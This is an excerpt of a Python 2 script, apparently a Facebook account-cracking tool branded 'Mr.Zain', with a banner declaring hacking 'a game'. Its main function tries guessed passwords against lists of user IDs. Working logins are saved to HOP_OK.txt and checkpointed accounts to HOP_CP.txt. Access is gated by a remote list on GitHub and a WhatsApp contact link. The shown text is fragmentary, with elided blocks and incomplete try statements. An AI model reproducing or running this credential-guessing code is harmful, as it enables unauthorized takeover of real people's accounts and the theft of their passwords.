...
__author__ = 'Mr.Zain'
__copyright = 'All rights reserved . Copyright  Mr.Zain'
...
\033[1;93m\033[1;96m\033[1;91m \033[1;97m\033[1;92m  
\033[1;93m\033[1;96m\033[1;91m\033[1;97m\033[1;92m 
                                              Z͓̽a͓̽i͓̽n͓̽ X͓̽ K͓̽i͓̽n͓̽z͓̽a͓̽
\033[1;97m═══════════════════════════════════════════
\033[1;90m➣ HACKING IS NOT A CRIME IT’S A GAME 
\033[1;90m➣ AUTHOR :\033[1;92m Sardar Zain
...
def reg():
    ...
    try:
        ...
        reg2()
    r = requests.get('https://raw.githubusercontent.com/Mr-Zain/freedom/main/server.txt').text
    if to in r:
        ...
        os.system('xdg-open https://wa.me/+923479500401')
        reg()
...
def a_s():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;92m[Zain-Ok] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\033[1;31;1m[Zain-Cp] ' + uid + ' | ' + pass1
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;92m[Zain-Ok] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
        ...
        try:
            ...
            if 'loc' in q:
                ...
                if 'loc' in q:
                    ...
                    print '\033[1;31;1m[Zain-Cp] ' + uid + ' | ' + pass2
                    cp = open('HOP_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
